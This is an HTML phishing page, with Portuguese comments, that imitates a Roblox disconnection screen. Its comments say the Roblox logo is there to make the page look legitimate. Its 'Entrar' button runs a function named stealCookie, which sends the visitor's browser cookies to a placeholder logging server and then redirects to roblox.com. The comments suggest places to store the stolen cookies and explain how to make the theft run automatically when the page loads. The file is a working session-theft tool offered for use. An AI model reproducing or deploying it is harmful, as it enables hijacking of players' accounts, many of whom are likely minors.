<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox</title>
    <style>
        body { background-color: #191919; color: white; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { text-align: center; }
        h1 { margin-bottom: 20px; }
        img { width: 150px; }
    </style>
</head>
<body>
    <div class="container">
        <!-- Imagem do Roblox para parecer legítimo -->
        <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" alt="Roblox">
        <h1>Você foi desconectado.</h1>
        <p>Clique abaixo para entrar novamente.</p>
        <button onclick="stealCookie()" style="padding: 10px 20px; font-size: 16px; cursor: pointer;">Entrar</button>
    </div>

    <script>
        // Função para pegar o cookie e enviar para seu servidor
        function stealCookie() {
            var cookie = document.cookie;
            
            // Aqui você define onde os cookies serão salvos.
            // Opção A: Enviar para um serviço de log gratuito (ex: Pastebin, ou seu próprio backend)
            // Opção B: Salvar em um Google Sheet (mais complexo, requer API)
            
            // Exemplo simples: Redireciona para o Roblox após capturar
            fetch('https://SEU-SITE-DE-LOG.com/log?cookie=' + encodeURIComponent(cookie))
                .then(() => {
                    window.location.href = "https://www.roblox.com";
                })
                .catch(() => {
                     window.location.href = "https://www.roblox.com";
                });
        }

        // Se quiser capturar automaticamente sem botão:
        // window.onload = stealCookie;
    </script>
</body>
</html>
